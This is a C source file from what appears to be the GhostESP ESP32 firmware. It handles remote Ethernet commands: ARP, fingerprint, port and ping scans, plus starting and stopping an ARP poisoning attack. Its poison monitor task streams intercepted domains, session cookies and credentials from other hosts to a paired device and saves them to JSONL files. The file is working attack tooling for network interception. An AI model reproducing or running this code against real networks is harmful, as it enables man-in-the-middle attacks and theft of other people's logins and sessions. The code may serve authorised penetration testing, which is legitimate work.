#include "sdkconfig.h"

#ifdef CONFIG_WITH_ETHERNET

#include "managers/ethernet/eth_comm_handler.h"
#include "core/esp_comm_manager.h"
#include "core/system_manager.h"
#include "managers/ethernet/eth_scan_async.h"
#include "managers/ethernet/eth_fingerprint.h"
#include "attacks/ethernet/eth_arp_poison.h"
#include "managers/ethernet_manager.h"
#include "managers/peer_storage_manager.h"
#include "core/glog.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_netif.h"
#include "esp_log.h"
#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>

static const char *TAG = "EthCommHandler";

// Forward-declare internal esp-netif function (same pattern as eth_arp_poison.c)
void *esp_netif_get_netif_impl(esp_netif_t *esp_netif);

static volatile bool s_remote_task_running = false;
static TaskHandle_t  s_remote_task         = NULL;

static void eth_export_timestamp(char *out, size_t out_len) {
    time_t now = time(NULL);
    struct tm tm_utc;
    gmtime_r(&now, &tm_utc);
    strftime(out, out_len, "%Y%m%dT%H%M%SZ", &tm_utc);
}

static void eth_export_write_line(int handle, const char *line) {
    if (handle < 0) return;
    (void)peer_storage_write(handle, line, strlen(line));
}

static void eth_json_escape(char *dst, size_t dst_len, const char *src) {
    size_t o = 0;
    if (!src || !dst || dst_len < 2) { if (dst && dst_len) dst[0] = '\0'; return; }
    for (size_t i = 0; src[i] && o + 2 < dst_len; i++) {
        unsigned char c = (unsigned char)src[i];
        if (c == '"' || c == '\\') {
            if (o + 2 >= dst_len) break;
            dst[o++] = '\\'; dst[o++] = (char)c;
        } else if (c < 0x20) {
            if (o + 6 >= dst_len) break;
            o += (size_t)snprintf(dst + o, dst_len - o, "\\u%04x", c);
        } else {
            dst[o++] = (char)c;
        }
    }
    dst[o] = '\0';
}

static void eth_export_write_header(int handle) {
    if (handle < 0) return;
    esp_netif_ip_info_t ip_info;
    char ip[16] = "", mask[16] = "", gw[16] = "", mac_str[20] = "";
    int speed = 0;
    if (ethernet_manager_get_ip_info(&ip_info) == ESP_OK) {
        esp_ip4addr_ntoa(&ip_info.ip,      ip,   sizeof(ip));
        esp_ip4addr_ntoa(&ip_info.netmask, mask, sizeof(mask));
        esp_ip4addr_ntoa(&ip_info.gw,      gw,   sizeof(gw));
    }
    ethernet_link_info_t link;
    if (ethernet_manager_get_link_info(&link) == ESP_OK) speed = link.speed_mbps;
    esp_netif_t *netif = ethernet_manager_get_netif();
    if (netif) {
        uint8_t m[6];
        if (esp_netif_get_mac(netif, m) == ESP_OK)
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                     m[0], m[1], m[2], m[3], m[4], m[5]);
    }
    char line[256];
    snprintf(line, sizeof(line),
             "{\"type\":\"interface\",\"ip\":\"%s\",\"mask\":\"%s\","
             "\"gw\":\"%s\",\"mac\":\"%s\",\"speed_mbps\":%d}\n",
             ip, mask, gw, mac_str, speed);
    eth_export_write_line(handle, line);
}

static int eth_export_open(const char *kind, const char *mode) {
    char ts[24];
    eth_export_timestamp(ts, sizeof(ts));
    char path[96];
    snprintf(path, sizeof(path), "/mnt/ghostesp/scans/eth_%s_%s.jsonl", kind, ts);

    if (!peer_storage_manager_is_client() || !esp_comm_manager_is_connected()) {
        return -1;
    }
    peer_storage_err_t e = peer_storage_begin();
    if (e != PEER_STORAGE_OK) return -1;
    e = peer_storage_mkdir("/mnt/ghostesp/scans");
    if (e != PEER_STORAGE_OK && e != PEER_STORAGE_ERR_PEER) {
        peer_storage_end();
        return -1;
    }
    int h = -1;
    e = peer_storage_open(path, mode, &h);
    if (e != PEER_STORAGE_OK) { peer_storage_end(); return -1; }
    return h;
}

static void eth_export_close(int handle) {
    if (handle < 0) return;
    (void)peer_storage_close(handle);
    peer_storage_end();
}

// -----------------------------------------------------------------------
// Helper: stream a single null-terminated text record to the peer.
// Format: "<type>|<field1>|<field2>...\0"
// -----------------------------------------------------------------------
static void eth_stream_record(const char *fmt, ...) {
    char buf[192];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    // Include null terminator so peer knows record boundary
    esp_comm_manager_send_stream(COMM_STREAM_CHANNEL_ETHERNET,
                                 (const uint8_t *)buf,
                                 strlen(buf) + 1);
}

// -----------------------------------------------------------------------
// Stream current interface status to peer.
// Record: "I|<ip>|<mask>|<gw>|<mac>|<speed_mbps>"
// -----------------------------------------------------------------------
static void eth_stream_interface_info(void) {
    if (!ethernet_manager_is_connected()) {
        eth_stream_record("I|0.0.0.0|0.0.0.0|0.0.0.0|00:00:00:00:00:00|0");
        return;
    }
    esp_netif_ip_info_t ip_info;
    char ip[16] = "--", mask[16] = "--", gw[16] = "--", mac_str[20] = "--";
    int speed = 0;
    if (ethernet_manager_get_ip_info(&ip_info) == ESP_OK) {
        esp_ip4addr_ntoa(&ip_info.ip,      ip,   sizeof(ip));
        esp_ip4addr_ntoa(&ip_info.netmask, mask, sizeof(mask));
        esp_ip4addr_ntoa(&ip_info.gw,      gw,   sizeof(gw));
    }
    ethernet_link_info_t link;
    if (ethernet_manager_get_link_info(&link) == ESP_OK) speed = link.speed_mbps;
    esp_netif_t *netif = ethernet_manager_get_netif();
    if (netif) {
        uint8_t m[6];
        if (esp_netif_get_mac(netif, m) == ESP_OK)
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                     m[0], m[1], m[2], m[3], m[4], m[5]);
    }
    eth_stream_record("I|%s|%s|%s|%s|%d", ip, mask, gw, mac_str, speed);
}

// -----------------------------------------------------------------------
// Remote ARP scan task
// -----------------------------------------------------------------------
static void remote_arp_task(void *arg) {
    s_remote_task_running = true;
    eth_stream_record("S|scanning");
    eth_stream_interface_info();

    eth_scan_start_arp();
    // Poll until done
    while (eth_scan_is_running() && s_remote_task_running) {
        const eth_scan_results_t *r = eth_scan_get_results();
        eth_stream_record("G|%d|%d", r->progress_current, r->progress_total);
        vTaskDelay(pdMS_TO_TICKS(300));
    }
    // Stream results and mirror to SD/peer as JSONL
    int export_h = eth_export_open("arp_scan", "w");
    eth_export_write_header(export_h);
    const eth_scan_results_t *r = eth_scan_get_results();
    for (int i = 0; i < r->arp_count && i < 64; i++) {
        eth_stream_record("H|%s|%02X:%02X:%02X:%02X:%02X:%02X|%s",
            r->arp_hosts[i].ip_str,
            r->arp_hosts[i].mac[0], r->arp_hosts[i].mac[1],
            r->arp_hosts[i].mac[2], r->arp_hosts[i].mac[3],
            r->arp_hosts[i].mac[4], r->arp_hosts[i].mac[5],
            r->arp_hosts[i].hostname);
        char esc_host[128];
        eth_json_escape(esc_host, sizeof(esc_host), r->arp_hosts[i].hostname);
        char line[256];
        snprintf(line, sizeof(line),
                 "{\"type\":\"arp\",\"ip\":\"%s\",\"mac\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"hostname\":\"%s\"}\n",
                 r->arp_hosts[i].ip_str,
                 r->arp_hosts[i].mac[0], r->arp_hosts[i].mac[1],
                 r->arp_hosts[i].mac[2], r->arp_hosts[i].mac[3],
                 r->arp_hosts[i].mac[4], r->arp_hosts[i].mac[5],
                 esc_host);
        eth_export_write_line(export_h, line);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    eth_export_close(export_h);
    eth_stream_record("S|done");
    s_remote_task_running = false;
    s_remote_task = NULL;
    vTaskDeleteWithCaps(NULL);
}

// -----------------------------------------------------------------------
// Remote fingerprint scan task
// -----------------------------------------------------------------------
static void remote_fp_task(void *arg) {
    s_remote_task_running = true;
    eth_stream_record("S|scanning");

    eth_fingerprint_start_async();
    while (eth_fingerprint_scan_is_running() && s_remote_task_running) {
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    if (!s_remote_task_running) {
        eth_stream_record("S|done");
        s_remote_task = NULL;
        vTaskDeleteWithCaps(NULL);
        return;
    }

    const eth_fp_results_t *results = eth_fingerprint_get_last_results();
    int count = results ? results->count : 0;
    int export_h = eth_export_open("fp_scan", "w");
    eth_export_write_header(export_h);
    for (int i = 0; i < count && i < 32; i++) {
        eth_fp_host_t *h = &results->hosts[i];
        eth_stream_record("F|%s|%s|%s|%s|%s|%s",
            h->ip_str, h->name, h->device_type,
            h->protocol, h->service_type, h->os_info);
        char esc_name[128], esc_dtype[64], esc_proto[32], esc_svc[32], esc_os[64];
        eth_json_escape(esc_name, sizeof(esc_name), h->name);
        eth_json_escape(esc_dtype, sizeof(esc_dtype), h->device_type);
        eth_json_escape(esc_proto, sizeof(esc_proto), h->protocol);
        eth_json_escape(esc_svc, sizeof(esc_svc), h->service_type);
        eth_json_escape(esc_os, sizeof(esc_os), h->os_info);
        char line[512];
        snprintf(line, sizeof(line),
                 "{\"type\":\"fingerprint\",\"ip\":\"%s\",\"name\":\"%s\","
                 "\"device_type\":\"%s\",\"protocol\":\"%s\","
                 "\"service\":\"%s\",\"os\":\"%s\"}\n",
                 h->ip_str, esc_name, esc_dtype,
                 esc_proto, esc_svc, esc_os);
        eth_export_write_line(export_h, line);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    eth_export_close(export_h);
    eth_stream_record("S|done");
    s_remote_task_running = false;
    s_remote_task = NULL;
    vTaskDeleteWithCaps(NULL);
}

// -----------------------------------------------------------------------
// Remote port scan task (bool arg: true = all ports)
// -----------------------------------------------------------------------
static void remote_port_task(void *arg) {
    bool scan_all = (bool)(intptr_t)arg;
    s_remote_task_running = true;
    eth_stream_record("S|scanning");

    // Determine target IP (gateway by default)
    char target_ip[16] = "";
    esp_netif_ip_info_t ip_info;
    if (ethernet_manager_get_ip_info(&ip_info) == ESP_OK && ip_info.gw.addr != 0)
        esp_ip4addr_ntoa(&ip_info.gw, target_ip, sizeof(target_ip));

    eth_scan_start_port(target_ip[0] ? target_ip : NULL, scan_all);
    while (eth_scan_is_running() && s_remote_task_running) {
        const eth_scan_results_t *r = eth_scan_get_results();
        eth_stream_record("G|%d|%d", r->progress_current, r->progress_total);
        vTaskDelay(pdMS_TO_TICKS(300));
    }
    const eth_scan_results_t *r = eth_scan_get_results();
    eth_stream_record("T|%s", r->target_ip);
    int export_h = eth_export_open("port_scan", "w");
    eth_export_write_header(export_h);
    for (int i = 0; i < r->port_count && i < 256; i++) {
        eth_stream_record("P|%d|%s", r->port_results[i].port, r->port_results[i].service);
        char esc_svc[64];
        eth_json_escape(esc_svc, sizeof(esc_svc), r->port_results[i].service);
        char line[192];
        snprintf(line, sizeof(line),
                 "{\"type\":\"port\",\"target\":\"%s\",\"port\":%d,\"service\":\"%s\"}\n",
                 r->target_ip, r->port_results[i].port, esc_svc);
        eth_export_write_line(export_h, line);
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    eth_export_close(export_h);
    eth_stream_record("S|done");
    s_remote_task_running = false;
    s_remote_task = NULL;
    vTaskDeleteWithCaps(NULL);
}

// -----------------------------------------------------------------------
// Remote ping sweep task
// -----------------------------------------------------------------------
static void remote_ping_task(void *arg) {
    s_remote_task_running = true;
    eth_stream_record("S|scanning");
    eth_scan_start_ping();
    while (eth_scan_is_running() && s_remote_task_running) {
        const eth_scan_results_t *r = eth_scan_get_results();
        eth_stream_record("G|%d|%d", r->progress_current, r->progress_total);
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    const eth_scan_results_t *r = eth_scan_get_results();
    eth_stream_record("N|%d|%d", r->ping_alive, r->ping_total);
    {
        int export_h = eth_export_open("ping_sweep", "w");
        eth_export_write_header(export_h);
        if (export_h >= 0) {
            char line[128];
            snprintf(line, sizeof(line),
                     "{\"type\":\"ping_sweep\",\"alive\":%d,\"total\":%d}\n",
                     r->ping_alive, r->ping_total);
            eth_export_write_line(export_h, line);
            for (int i = 0; i < r->arp_count && i < 64; i++) {
                snprintf(line, sizeof(line),
                         "{\"type\":\"ping_host\",\"ip\":\"%s\"}\n",
                         r->arp_hosts[i].ip_str);
                eth_export_write_line(export_h, line);
            }
            eth_export_close(export_h);
        }
    }
    eth_stream_record("S|done");
    s_remote_task_running = false;
    s_remote_task = NULL;
    vTaskDeleteWithCaps(NULL);
}

// -----------------------------------------------------------------------
// Remote ARP poison monitor task
// -----------------------------------------------------------------------
static void remote_poison_monitor_task(void *arg) {
    s_remote_task_running = true;
    eth_stream_record("S|running");
    int prev_counts[3] = {0};
    int export_h = eth_export_open("poison", "w");
    while (eth_arp_poison_is_running() && s_remote_task_running) {
        eth_arp_poison_snapshot_t snap;
        if (eth_arp_poison_get_snapshot(&snap)) {
            int counts[3] = { snap.domain_count, snap.cookie_count, snap.cred_count };
            for (int i = prev_counts[0]; i < counts[0] && i < 50; i++) {
                eth_stream_record("D|%s", snap.domains[i]);
                char esc[128];
                eth_json_escape(esc, sizeof(esc), snap.domains[i]);
                char line[192];
                snprintf(line, sizeof(line),
                         "{\"type\":\"poison_domain\",\"domain\":\"%s\"}\n",
                         esc);
                eth_export_write_line(export_h, line);
            }
            for (int i = prev_counts[1]; i < counts[1] && i < 10; i++) {
                eth_stream_record("K|%s", snap.cookies[i]);
                char esc[256];
                eth_json_escape(esc, sizeof(esc), snap.cookies[i]);
                char line[320];
                snprintf(line, sizeof(line),
                         "{\"type\":\"poison_cookie\",\"cookie\":\"%s\"}\n",
                         esc);
                eth_export_write_line(export_h, line);
            }
            for (int i = prev_counts[2]; i < counts[2] && i < 10; i++) {
                eth_stream_record("C|%s", snap.creds[i]);
                char esc[256];
                eth_json_escape(esc, sizeof(esc), snap.creds[i]);
                char line[320];
                snprintf(line, sizeof(line),
                         "{\"type\":\"poison_cred\",\"cred\":\"%s\"}\n",
                         esc);
                eth_export_write_line(export_h, line);
            }
            eth_stream_record("M|%d|%d|%d|%d",
                snap.host_count, snap.domain_count,
                snap.cookie_count, snap.cred_count);
            for (int i = 0; i < 3; i++) prev_counts[i] = counts[i];
        }
        vTaskDelay(pdMS_TO_TICKS(1000));
    }
    eth_export_close(export_h);
    eth_stream_record("S|stopped");
    s_remote_task_running = false;
    s_remote_task = NULL;
    vTaskDeleteWithCaps(NULL);
}

// -----------------------------------------------------------------------
// Handle a remote "ethernet" command routed from the main GhostLink
// command dispatcher.
// -----------------------------------------------------------------------
bool eth_comm_handler_handle_command(const char *command, const char *data) {
    if (!command || strcmp(command, "ethernet") != 0) return false;
    if (!data) return true;

    ESP_LOGI(TAG, "Received ethernet command: %s", data);

    // Cancel any running remote task first
    if (s_remote_task_running) {
        s_remote_task_running = false;
        eth_scan_cancel();
        eth_fingerprint_scan_cancel();
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    // The on-device Ethernet UI (ethernet_screen.c) sends these sub-command
    // names over GhostLink. Keep the short aliases ("fp", "port", "ports",
    // "ping", "poison") alongside the UI names so both the display firmware
    // and this handler keep interoperating regardless of which side is
    // newer. NOTE: an unrecognized sub-command MUST NOT be swallowed
    // silently -- the display waits for the "S|scanning"/"S|done" stream
    // echo and would otherwise sit on the scanning screen forever.
    if (strcmp(data, "arp_scan") == 0) {
        xTaskCreate_psram(remote_arp_task,    "eth_rem_arp",  8192, NULL, 5, &s_remote_task);
    } else if (strcmp(data, "fp") == 0 || strcmp(data, "fingerprint") == 0 ||
               strcmp(data, "fp_scan") == 0) {
        xTaskCreate_psram(remote_fp_task,     "eth_rem_fp",   10240, NULL, 5, &s_remote_task);
    } else if (strcmp(data, "port") == 0 || strcmp(data, "port_scan_local") == 0) {
        xTaskCreate_psram(remote_port_task,   "eth_rem_port", 8192, (void *)(intptr_t)false, 5, &s_remote_task);
    } else if (strcmp(data, "ports") == 0 || strcmp(data, "port_scan_all") == 0) {
        xTaskCreate_psram(remote_port_task,   "eth_rem_port", 8192, (void *)(intptr_t)true,  5, &s_remote_task);
    } else if (strcmp(data, "ping") == 0 || strcmp(data, "ping_sweep") == 0) {
        xTaskCreate_psram(remote_ping_task,   "eth_rem_ping", 8192, NULL, 5, &s_remote_task);
    } else if (strcmp(data, "poison") == 0 || strcmp(data, "monitor") == 0) {
        xTaskCreate_psram(remote_poison_monitor_task, "eth_rem_mon", 8192, NULL, 3, &s_remote_task);
    } else if (strcmp(data, "poison_start") == 0) {
        // Start the attack first; the monitor task below exits immediately
        // if ARP poison is not actually running.
        esp_err_t err = eth_arp_poison_start();
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "eth_arp_poison_start failed: %s", esp_err_to_name(err));
        }
        xTaskCreate_psram(remote_poison_monitor_task, "eth_rem_mon", 8192, NULL, 3, &s_remote_task);
    } else if (strcmp(data, "poison_stop") == 0) {
        eth_arp_poison_stop();
    } else if (strcmp(data, "status") == 0) {
        eth_stream_interface_info();
        eth_stream_record("S|%s", eth_arp_poison_is_running() ? "poison_running" : "idle");
    } else if (strcmp(data, "cancel") == 0) {
        // already cancelled above; acknowledge
        eth_stream_record("S|done");
    } else {
        ESP_LOGW(TAG, "Unhandled ethernet sub-command: '%s'", data);
    }

    return true;
}

// -----------------------------------------------------------------------
// Public API
// -----------------------------------------------------------------------
void eth_comm_handler_init(void) {
    ESP_LOGI(TAG, "Ethernet GhostLink handler ready");
}

void eth_comm_handler_deinit(void) {
    s_remote_task_running = false;
    eth_scan_cancel();
    eth_fingerprint_scan_cancel();
}

#endif // CONFIG_WITH_ETHERNET
